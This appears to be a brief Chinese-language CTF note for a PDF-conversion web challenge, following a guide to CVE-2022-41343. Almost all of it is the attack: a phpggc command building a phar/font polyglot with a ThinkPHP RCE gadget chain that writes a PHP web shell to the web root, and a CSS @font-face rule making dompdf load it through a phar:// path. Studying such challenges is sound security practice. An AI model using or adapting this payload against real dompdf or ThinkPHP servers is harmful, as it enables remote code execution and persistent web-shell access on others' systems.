...
按照这篇文章操作[CVE-2022-41343 - 通过 Phar 反序列化的 RCE (buaq.net)](https://buaq.net/go-129526.html)，但是phpggc要调整为thinkphp 5.0.2x
...
php -d phar.readonly=0 phpggc ThinkPHP/RCE1 system "echo '<?php system(\$_GET[0]); ?>' > /var/www/html/shell.php" -p phar -pp /mnt/c/Users/wum0nster/Desktop/buu/DAS2023_4/WEB-pdf_convert/exp/font.ttf -o font-polyglot.phar
...
<style>
    @font-face {
        font-family:'exploit';
        src:url('phar:///var/www/vendor/dompdf/dompdf/lib/fonts/exploit_normal_cc42152aa49d1985bd153bdcb5b33b6c.ttf##');
        font-weight:'normal';
        font-style:'normal';
    }
</style>
